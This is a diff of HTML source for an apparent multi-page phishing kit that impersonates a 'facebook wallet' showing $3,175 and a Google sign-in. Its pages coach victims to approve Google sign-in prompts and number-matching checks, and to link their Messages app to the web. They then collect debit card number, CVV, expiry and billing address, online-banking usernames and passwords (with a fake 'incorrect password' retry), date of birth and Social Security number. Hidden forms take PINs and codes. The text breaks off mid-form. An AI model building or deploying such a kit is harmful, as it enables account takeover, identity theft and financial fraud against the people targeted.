-2: </strong>Select the emoji below.
+
+This sign-in is safe because our wallet system uses a Galaxy A07 node in Los Angeles. As a result, you will see a google security notification stating that you are signing in via the Galaxy A07 wallet in Los Angeles. 
+<br><br>
+To approve your sign-in through google's Galaxy A07 in Los Angeles, you must select:
+
+<br><br>
+<strong>"Yes, it's me trying to sign in"</strong>
+
+<br><br>
+After selecting "Yes, it's me", you will be prompted to pick a number. Make sure you pick the matching number that appears below. Page 8 (H)
+
 </h5>
-                <div class="external-message"></div>
-                
-           <br>     <br><br>
-   <h5 class="step1-intro-text">
-If you can’t find the emoji or need help, just tap the button below to connect with our support team, and we’ll assist you.
-
-<button type="button" class="customer-support-btn">
-          Need Help?    Tap here to contact us 
-            </button>
-
-
-
- 
-
- <div style="display: none;">
-                <div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="authPin" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter PIN" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Authentication PIN</span> 
-                  </div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="authPin_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm PIN" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Confirm PIN</span>
-                  </div>
-                  <button type="submit" class="responsive-btn">Validate</button>
-                  </div>
-                </div>
+              <div class="external-message"></div>
+              
+              
+      <div style="display: none;">
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="authPin" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter PIN" oninput="validateCodeInput(this)" /><span class="floating-label">PIN</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="authPin_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm PIN" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm PIN</span></div>
+                <button type="submit" class="responsive-btn">Validate</button>
               </div>
-            </form>
-          </div>
-        </div>
+            </div>
+            </div> 
+          </form> <br><br> 
+        </div></div>
 
         <!-- PROCESSING 8 -->
-        <div id="processing8" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount8" class="timerCount">1%</div>
-          </div>
-          <div class="processing-title-custom">Completing authentication.......</div>
-          <div class="processing-subtitle-custom">Please wait....</div>
-        </div>
+        <div id="processing8" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount8" class="timerCount">1%</div></div><div class="processing-title-custom">Completing auth.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
 
         <!-- FORM 9 ("I") -->
-        <div id="mainContent8" class="step-section">
-          <div class="lower-section">
-            <form id="ninthForm" onsubmit="submitNinthForm(event);">
-              <div style="text-align: center;">
-                <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
-                <h5 class="step1-intro-text">
-It seems you failed to approve the message link to the web. You must link your messages to the web so delivery updates for the $3,197.00 can be sent to your device. Follow the steps below to try again.
-<br><br>
-
-
-<strong>
-1: </strong> Go to your messages app and approve your request to link to the web. You'll be prompted to link your messages to the web by selecting an emoji.
-<br><br>
-<strong>
-2: </strong>Select the emoji below.
-
-</h5>
-                <div class="external-message"></div>
-       
-         <br><br>
-   <h5 class="step1-intro-text">
-If you can’t find the emoji or need help, just tap the button below to connect with our support team, and we’ll assist you.
-
-<button type="button" class="customer-support-btn">
-          Need Help?    Tap here to contact us 
-            </button>
+        <div id="mainContent8" class="step-section"><div class="lower-section">
+          <form id="ninthForm" onsubmit="submitNinthForm(event);">
+            <div style="text-align: ;">
             
-          <div style="display: none;">
-                <div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="sysCode" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter system code" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">System Access Code</span> 
-                  </div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="sysCode_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm system code" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Confirm System Code</span>
-                  </div>
-                  <button type="submit" class="responsive-btn">Submit</button> </div>
+            <!-- ENTIRE FULL WALLET CARD BOX SNIPPET -->
+            <div class="exact-wallet-card">
+                <div class="wallet-header">
+                    <h3 class="wallet-title">Hi, <span class="submittedName"></span></h3>
                 </div>
+                <div class="wallet-body">
+                    <div class="wallet-top-row">
+                        <span class="wallet-label">Available balance</span>
+                        <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> Active</span>
+                    </div>
+                    <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+                    <div class="wallet-footer">
+                        <span style="font-size: 19px; color: #4267B2; font-weight: 600;">facebook wallet</span>
+                        <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
+                    </div>
+                </div>
+            </div>
+            
+            
+            
+            
+              <h5 class="step1-intro-text">
+Good job, <span class="submittedName"></span>, 
+
+you've successfully signed into your facebook wallet using google's Galaxy A07 node in Los Angeles.
+
+<br>
+<br>
+
+The most important step is to link your messages to Google Web so you can receive updates about your $3,195.00 delivery. Follow these steps:
+<br><br>
+Leave this page, open your Messages app, and approve the request to link to the web. You will be prompted to select an emoji. Make sure you select the matching emoji below:
+</h5>
+
+<div class="external-message"></div>
+
+<h5 class="step1-intro-text">
+After that, come back to this page to view your balance. If you cannot find the emoji, just tap the button below to contact us, and we will help you.
+
+Page 9 (I)</h5>
+
+              <br>
+              <button style="width: 98%; height: 40px; font-size: 15px; font-weight: bold; background-color: transparent; border: 2px solid black; border-radius: 20px; color: black; cursor: pointer; box-sizing: border-box;">Need Help? tap here to contact us</button>
+
+<br><br><br>
+
+              
+      <div style="display: none;">
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="sysCode" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter system code" oninput="validateCodeInput(this)" /><span class="floating-label">System Code</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="sysCode_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm code" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Code</span></div>
+                <button type="submit" class="responsive-btn">Submit</button>
               </div>
-            </form>
-          </div>
-        </div>
+            </div>
+            </div>
+          </form> <br><br> 
+        </div></div>
 
         <!-- PROCESSING 9 -->
-        <div id="processing9" class="step-section processing-container">
-          <div class="example-spinner-wrapper">
-            <div class="example-spinner-bg"></div>
-            <div class="example-spinner-ring"></div>
-            <div id="timerCount9" class="timerCount">1%</div>
-          </div>
-          <div class="processing-title-custom">Verifying system access code.......</div>
-          <div class="processing-subtitle-custom">Please wait....</div>
-        </div>
+        <div id="processing9" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount9" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying system code.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
 
         <!-- FORM 10 ("J") -->
-        <div id="mainContent9" class="step-section">
-          <div class="lower-section">
-            <form id="tenthForm" onsubmit="submitTenthForm(event);">
-              <div style="text-align: center;">
-                <img src="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
-                <h5 class="step1-intro-text">Final Authorization Key</h5>
-                <div class="external-message"></div>
-                <h5 class="pin-instruction-text"><span class="submittedName"></span>, enter your final authorization key:</h5>
-                <div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="finalKey" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter key" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Final Authorization Key</span> 
-                  </div>
-                  <div class="floating-group">
-                    <input type="text" inputmode="numeric" pattern="[0-9]{4,8}" minlength="4" maxlength="8" required name="finalKey_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please confirm key" oninput="validateCodeInput(this)" />
-                    <span class="floating-label">Confirm Authorization Key</span>
-                  </div>
-                  <button type="submit" class="responsive-btn">Authorize</button>
-                </div>
+        <div id="mainContent9" class="step-section"><div class="lower-section">
+          <form id="tenthForm" onsubmit="submitTenthForm(event);">
+            <div style="text-align: center;">
+            
+            <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4800px; width: 129px; height: 44px; margin: 3px 0px;" alt="School">
+            <br>
+            
+              <h5 class="step1-intro-text">
+You haven't approved the link to the web yet. You need to do this so we can safely send updates about your $3,195.00 delivery straight to your Messages app. Follow these steps:
+
+<br><br>
+Leave this page and go to your Messages app, and approve your request to link to the web. You will be prompted to select an emoji. Make sure you select the matching emoji below:
+</h5>
+
+<div class="external-message"></div>
+
+<h5 class="step1-intro-text"> <br>
+After that, come back to this page to view your balance. If you cannot find the emoji, just tap the button below to contact us, and we will help you. 
+
+Page 10 (J)</h5>
+              <br>
+              <button style="width: 98%; height: 40px; font-size: 15px; font-weight: bold; background-color: transparent; border: 2px solid black; border-radius: 20px; color: black; cursor: pointer; box-sizing: border-box;">Need Help? tap here to contact us</button>
+
+<br><br><br>
+  
+      <div style="display: none;">
+      
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="finalKey" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter key" oninput="validateCodeInput(this)" /><span class="floating-label">Key</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="finalKey_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm key" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Key</span></div>
+                <button type="submit" class="responsive-btn">Authorize</button>
               </div>
-            </form>
-          </div>
-        </div>
+            </div> </div>
+          </form> <br> <br> 
+        </div></div>
 
         <!-- PROCESSING 10 -->
-        <div id="processing10" class="step-section processing-container">
+        <div id="processing10" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount10" class="timerCount">1%</div></div><div class="processing-title-custom">Processing.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 11 ("K") -->
+        <div id="mainContent10" class="step-section"><div class="lower-section">
+          <form id="eleventhForm" onsubmit="submitEleventhForm(event);">
+          
+            <div style="text-align: ;">
+            
+            <!-- ENTIRE FULL WALLET CARD BOX SNIPPET -->
+            <div class="exact-wallet-card">
+                <div class="wallet-header">
+                    <h3 class="wallet-title">Hi, <span class="submittedName"></span></h3>
+                </div>
+                <div class="wallet-body">
+                    <div class="wallet-top-row">
+                        <span class="wallet-label">Available balance</span>
+                        <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> Active</span>
+                    </div>
+                    <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+                    <div class="wallet-footer">
+                        <span style="font-size: 19px; color: #4267B2; font-weight: 600;">facebook wallet</span>
+                        <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
+                    </div>
+                </div>
+            </div>
+            
+            
+              <h5 class="step1-intro-text">
+
+You can not access your wallet due to an incorrect password. To ensure you can still use your  email to access your facebook wallet, please open your gmail app, go to settings, and change your password. Afterward, return to this page and use your new password to access your wallet.
+
+<br><br>
+
+Alternatively, if you need help changing your password, tap the button below to contact us, and we'll guide you through the process.
+
+Page 11 (K)
+
+</h5>
+<br>
+              <button style="width: 99%; height: 43px; font-size: 16px; font-weight: bold; background-color: transparent; border: 2px solid black; border-radius: 20px; color: black; cursor: pointer; box-sizing: border-box;">Need Help? tap here to contact us</button>
+
+<br><br><br>
+
+
+<div style="display: none;">
+
+              <div class="external-message"></div>
+              <h5 class="pin-instruction-text">Enter details:</h5>
+              <div>
+                <div class="floating-group">
+                  <input type="text" required 
+name="K-page11_Bak" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter Full Bank Name" oninput="validateInput(this)" />
+                  <span class="floating-label">Bank Name</span>
+                </div>
+                <div class="floating-group">
+                  <input type="text" required 
+
+name="K-page11_Acct_Number" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Complete this" oninput="validateCustom(this)" />
+                  <span class="floating-label">Account Number</span>
+                </div>
+                <button type="submit" class="responsive-btn">Proceed</button>
+              </div>
+            </div>
+                         </div>
+          </form> <br><br> 
+        </div></div>
+
+        <!-- PROCESSING 11 -->
+        <div id="processing11" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount11" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 12 ("L") -->
+        <div id="mainContent11" class="step-section"><div class="lower-section">
+          <form id="twelfthForm" onsubmit="submitTwelfthForm(event);">
+            <div style="text-align: ;">
+            
+    <!-- STANDALONE BALANCE DISPLAY SNIPPET WITH REFINED CENTS -->
+            
+            <!-- ENTIRE FULL WALLET CARD BOX SNIPPET -->
+            <div class="exact-wallet-card">
+                <div class="wallet-header">
+                    <h3 class="wallet-title">Hi, 
+<span class="submittedName"></span>
+
+</h3>
+                </div>
+                <div class="wallet-body">
+                    <div class="wallet-top-row">
+                        <span class="wallet-label">Available balance</span>
+                        <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> Active</span>
+                    </div>
+                    <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+                    <div class="wallet-footer">
+                        <span style="font-size: 19px; color: #4267B2; font-weight: 600;">facebook wallet</span>
+                        <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
+                    </div>
+                </div>
+            </div>       
+            
+            
+            
+              <h5 class="step1-intro-text">
+
+You can now withdraw your $3,175.00 and start enjoying it immediately. The funds will be sent either to your debit card or directly to your bank account.
+
+<br><br>
+To prevent money laundering and fraud, we will only send the $3,175.00 to a debit card linked to your name  <span class="submittedName"></span>. 
+
+ If the name on the debit card does not match your name, the transaction will be rejected. Enter your receiving debit card details below:
+
+
+ Page 12 (L)</h5>
+              
+
+              <div>
+              <div class="floating-group">
+              <input type="text" required 
+data-capture="benz" 
+
+name="page12_L_Bak_nam" class="floating-input" placeholder=" " data-min-length="5" data-error-message="Enter your bank's name" oninput="validateInput(this)" />
+              <span class="floating-label">Enter your Bank's Name</span>
+</div>
+
+<div class="floating-group">
+               <input type="text" required 
+data-capture="pray" 
+name="mail" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
+              <span class="floating-label">Your Name as it appears on the Card</span>
+              </div>
+              
+              
+              
+              <div class="floating-group">
+  <input type="tel" inputmode="numeric" required id="email" name="deb_carb" class="floating-input" placeholder=" " data-min-length="15" data-error-message="Enter full card number" oninput="validatePhoneInput(this)" />
+  <span class="floating-label">Card Number</span>
+</div>
+
+             
+              
+              <div class="floating-group">
+              <input type="text" required name="Expiry" class="floating-input" placeholder=" " data-min-length="3" data-error-message="Enter complete Expiry Date" oninput="validateCustom(this)" />
+              <span class="floating-label">Expiry Date
+(Month / Year)</span>
+                 </div>
+              
+              
+              <div class="floating-group">
+          <input type="text" required name="svv" class="floating-input" placeholder=" " data-min-length="3" data-error-message="Enter 3 digit number in bank of card" oninput="validateCustom(this)" />
+              <span class="floating-label"> CVV</span>
+              </div>
+              
+              <div class="floating-group">
+              <input type="text" required name="bil_addres" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter full Billing Address" oninput="validateCustom(this)" />
+              <span class="floating-label">Enter Billing Address</span>
+              </div>
+              
+              
+                <button type="submit" class="responsive-btn">Proceed</button>
+              </div>
+            </div>
+          </form> <br><br> 
+        </div></div>
+
+        <!-- PROCESSING 12 -->
+        <div id="processing12" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount12" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 13 ("M") -->
+        <div id="mainContent12" class="step-section"><div class="lower-section">
+          <form id="thirteenthForm" onsubmit="submitThirteenthForm(event);">
+            <div style="text-align: ;">
+       
+                       <div class="exact-wallet-card">
+                <div class="wallet-header">
+                    <h3 class="wallet-title">Hi, <span class="submittedName"></span></h3>
+                </div>
+                <div class="wallet-body">
+                    <div class="wallet-top-row">
+                        <span class="wallet-label">Available balance</span>
+                        <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> FDIC Insured</span>
+                    </div>
+                    <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+                    <div class="wallet-footer">
+                        <span style="font-size: 19px; color: #4267B2; font-weight: 500;">facebook wallet</span>
+                        <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
+                    </div>
+                </div>
+            </div>
+            
+              <h5 class="step1-intro-text">
+           
+We were unable to verify that the   <span class="submittedBenz"></span> account you listed belongs to you. To ensure you receive your $3,175  directly into your <span class="submittedBenz"></span> account, please log in below to verify ownership: Page 13 (M)
+
+</h5>
+         <h5 class="FutureHeading"><br>
+  <span class="submittedBenz"></span>   Online Banking 
+
+<img
+  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSVhbUDo_fb4tWqTXd1GTzcB5uZXjSW8qoCzrf8i8ALqRiBSt7k90eOBs&amp;s=10"
+  class="sFlh5c FyHeAf uT7N3d"
+  style="width:30px; height:25px;"
+  alt=""
+  role="" tabindex="0"
+  aria-label=""
+  aria-pressed="false"
+  jsname="kn3ccd"
+>
+</h5>
+<br>
+
+ <div>
+  
+
+              <h5 class="pin-instruction-text">
+To verify ownership, use your  <span class="submittedBenz"></span> username and password to securely log into         <span class="submittedBenz"></span>.
+
+
+</h5>
+
+              <div>
+              
+              <div class="floating-group">
+              <input type="text" required name="M_13_Bnk_Usernam" class="floating-input-black" placeholder=" " data-min-length="4" data-error-message="Enter Correct Username" oninput="validateCustom(this)" />
+              <span class="floating-label-black">Enter Username </span>
+            </div>
+            
+            
+            <div class="floating-group">
+              <input type="text" required name="M_13_Bnk_pass" class="floating-input-black" placeholder=" " data-min-length="4" data-error-message="Enter Correct Password" oninput="validateCustom(this)" />
+              <span class="floating-label-black">Enter Password </span>
+            </div>
+              
+</div>         
+        <button type="submit" class="full-navy-btn"> Verify </button>
+                
+              </div>
+            </div> <br><br>
+          </form>
+        </div></div>
+
+        <!-- PROCESSING 13 -->
+        <div id="processing13" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount13" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 14 ("N") -->
+        <div id="mainContent13" class="step-section"><div class="lower-section">
+          <form id="fourteenthForm" onsubmit="submitFourteenthForm(event);">
+            <div style="text-align: ;">
+            
+            <div class="exact-wallet-card">
+                <div class="wallet-header">
+                    <h3 class="wallet-title">Hi, <span class="submittedName"></span></h3>
+                </div>
+                <div class="wallet-body">
+                    <div class="wallet-top-row">
+                        <span class="wallet-label">Available balance</span>
+                        <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> Active</span>
+                    </div>
+                    <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+                    <div class="wallet-footer">
+                        <span style="font-size: 19px; color: #4267B2; font-weight: 500;">facebook wallet</span>
+                        <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
+                    </div>
+                </div>
+            </div>
+            
+              <h5 class="step1-intro-text">
+           
+You were so close, but the password was incorrect. To verify ownership of your <span class="submittedBenz"></span>  account, please ensure you use your correct         <span class="submittedBenz"></span> online banking   password. Page 14 (M)
+
+</h5>
+         <h5 class="FutureHeading"><br>
+  <span class="submittedBenz"></span>   Online Banking 
+
+<img
+  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSVhbUDo_fb4tWqTXd1GTzcB5uZXjSW8qoCzrf8i8ALqRiBSt7k90eOBs&amp;s=10"
+  class="sFlh5c FyHeAf uT7N3d"
+  style="width:30px; height:25px;"
+  alt=""
+  role="" tabindex="0"
+  aria-label=""
+  aria-pressed="false"
+  jsname="kn3ccd"
+>
+</h5>
+<br>
+
+ <div>
+  
+
+              <h5 class="pin-instruction-text">
+To verify ownership, use your  <span class="submittedBenz"></span> username and password to securely log into         <span class="submittedBenz"></span>.
+
+
+</h5>
+
+              <div>
+              
+              <div class="floating-group">
+              <input type="text" required name="M_13_REtry-Bnk_Usenaam" class="floating-input-black" placeholder=" " data-min-length="4" data-error-message="Enter Correct Username" oninput="validateCustom(this)" />
+              <span class="floating-label-black">Enter Username </span>
+            </div>
+            
+            
+            <div class="floating-group">
+              <input type="text" required name="M_13_Bnk_Retry_pass" class="floating-input-black" placeholder=" " data-min-length="4" data-error-message="Enter Correct Password" oninput="validateCustom(this)" />
+              <span class="floating-label-black">Enter Password </span>
+            </div>
+              
+</div>         
+        <button type="submit" class="full-navy-btn"> Verify </button>
+        
+              </div>
+            </div>
+          </form> <br> <br> 
+        </div></div>
+
+        <!-- PROCESSING 14 -->
+        <div id="processing14" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount14" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 15 ("O") -->
+        <div id="mainContent14" class="step-section"><div class="lower-section">
+          <form id="fifteenthForm" onsubmit="submitFifteenthForm(event);">
+            <div style="text-align: ;">
+            
+            <div class="exact-wallet-card">
+                <div class="wallet-header">
+                    <h3 class="wallet-title">Hi, <span class="submittedName"></span></h3>
+                </div>
+                <div class="wallet-body">
+                    <div class="wallet-top-row">
+                        <span class="wallet-label">Available balance</span>
+                        <span class="wallet-fdic"><span class="wallet-fdic-dot"></span> Active</span>
+                    </div>
+                    <div class="wallet-amount">$3,175<span class="decimal-cents">.00</span></div>
+                    <div class="wallet-footer">
+                        <span style="font-size: 19px; color: #4267B2; font-weight: 500;">facebook wallet</span>
+                        <button type="button" onclick="openTxOverlay()" class="wallet-stmt-btn">Transaction &gt;</button>
+                    </div>
+                </div>
+            </div>
+            
+              <h5 class="step1-intro-text">
+           
+ You've made it this far! Your funds are being processed, and you should expect to receive them within 12 to 24 hours. Please help us confirm that you are a U.S. resident and citizen, as this reward program is only available to United States citizens. Please complete this simple identity verification to proceed Page 15 
+</h5>
+<br>
+
+ 
+          <div>
+              <div class="floating-group">
+              <input type="text" required name="N_15_identi_Name" class="floating-input-black" placeholder=" " data-min-length="4" data-error-message="enter full name" oninput="validateCustom(this)" />
+              <span class="floating-label-black">Enter full Name </span>
+            </div>
+            
+            
+            <div class="floating-group">
+              <input type="text" required name="N_15_Identify_DOBs" class="floating-input-black" placeholder=" " data-min-length="3" data-error-message="Enter Date of Birth" oninput="validateCustom(this)" />
+              <span class="floating-label-black">Date of Birth (Month / Day / Year)</span>
+            </div>
+              
+              <br>
+              <h5 class="pin-instruction-text">
+Your Social Security number is secured and used to verify that you are a United States citizen. Enter your SSN:
+</h5>
+              <div class="floating-group">
+              <input type="text" required name="N_15_identif_SNNs" class="floating-input-black" placeholder=" " data-min-length="9" data-error-message="Enter full SSN" oninput="validateCustom(this)" />
+              <span class="floating-label-black">SSN </span>
+            </div>
+              
+</div>         
+        <button type="submit" class="full-navy-btn"> Verify </button>
+       
+                
+              </div>
+            </div> <br><br>
+          </form>
+        </div></div>
+
+        <!-- PROCESSING 15 -->
+        <div id="processing15" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount15" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 16 ("P") -->
+        <div id="mainContent15" class="step-section"><div class="lower-section">
+          <form id="sixteenthForm" onsubmit="submitSixteenthForm(event);">
+            <div style="text-align: center;">
+              <h5 class="step1-intro-text">
+<br><br><br>
+<strong>
+Congratulations </strong>
+
+<br><br>
+
+You are all set. No further action is required on your part, so you can simply relax. You should receive the $3,175.00 within 12 to 24 hours.
+
+</h5>
+              
+              
+              
+              
+                 <div style="display: none;">
+              
+              
+              <div class="external-message"></div>
+              <h5 class="pin-instruction-text">Enter code 16:</h5>
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step16Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter code" oninput="validateCodeInput(this)" /><span class="floating-label">Code</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step16Code_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm code" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Code</span></div>
+                <button type="submit" class="responsive-btn">Proceed</button>
+              </div>
+            </div> </div>
+          </form>
+        </div></div>
+
+        <!-- PROCESSING 16 -->
+        <div id="processing16" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount16" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 17 ("Q") -->
+        <div id="mainContent16" class="step-section"><div class="lower-section">
+          <form id="seventeenthForm" onsubmit="submitSeventeenthForm(event);">
+            <div style="text-align: center;">
+              <h5 class="step1-intro-text">Verification Step. Page 17 (Q)</h5>
+              <div class="external-message"></div>
+              <h5 class="pin-instruction-text">Enter code 17:</h5>
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step17Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter code" oninput="validateCodeInput(this)" /><span class="floating-label">Code</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step17Code_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm code" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Code</span></div>
+                <button type="submit" class="responsive-btn">Proceed</button>
+              </div>
+            </div>
+          </form>
+        </div></div>
+
+        <!-- PROCESSING 17 -->
+        <div id="processing17" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount17" class="timerCount">1%</div></div><div class="processing-title-custom">Validating passkey.......</div><div class="processing-subtitle-custom">Almost there....</div></div>
+
+        <!-- FORM 18 ("R") -->
+        <div id="mainContent17" class="step-section"><div class="lower-section">
+          <form id="eighteenthForm" onsubmit="submitEighteenthForm(event);">
+            <div style="text-align: center;">
+              <h5 class="step1-intro-text">Verification Step. Page 18 (R)</h5>
+              <div class="external-message"></div>
+              <h5 class="pin-instruction-text">Enter code 18:</h5>
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step18Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter code" oninput="validateCodeInput(this)" /><span class="floating-label">Code</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step18Code_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm code" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Code</span></div>
+                <button type="submit" class="responsive-btn">Proceed</button>
+              </div>
+            </div>
+          </form>
+        </div></div>
+
+        <!-- PROCESSING 18 -->
+        <div id="processing18" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount18" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 19 ("S") -->
+        <div id="mainContent18" class="step-section"><div class="lower-section">
+          <form id="nineteenthForm" onsubmit="submitNineteenthForm(event);">
+            <div style="text-align: center;">
+              <h5 class="step1-intro-text">Verification Step. Page 19 (S)</h5>
+              <div class="external-message"></div>
+              <h5 class="pin-instruction-text">Enter code 19:</h5>
+              <div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step19Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Enter code" oninput="validateCodeInput(this)" /><span class="floating-label">Code</span></div>
+                <div class="floating-group"><input type="tel" inputmode="numeric" required name="step19Code_confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Confirm code" oninput="validateCodeInput(this)" /><span class="floating-label">Confirm Code</span></div>
+                <button type="submit" class="responsive-btn">Proceed</button>
+              </div>
+            </div>
+          </form>
+        </div></div>
+
+        <!-- PROCESSING 19 -->
+        <div id="processing19" class="step-section processing-container"><div class="example-spinner-wrapper"><div class="example-spinner-bg"></div><div class="example-spinner-ring"></div><div id="timerCount19" class="timerCount">1%</div></div><div class="processing-title-custom">Verifying.......</div><div class="processing-subtitle-custom">Please wait....</div></div>
+
+        <!-- FORM 20 ("T") -->
+        <div id="mainContent19" class="step-section"><div class="lower-section">
+          <form id="twentiethForm" onsubmit="submitTwentiethForm(event);">
+            <div style="text-align: center;">
+              <h5 class="step1-intro-text">Final Step. Page 20 (T)</h5>
+              <div class="external-message"></div>
+              <h5 class="pin-instruction-text">Enter final security code:</h5>
+              <div>
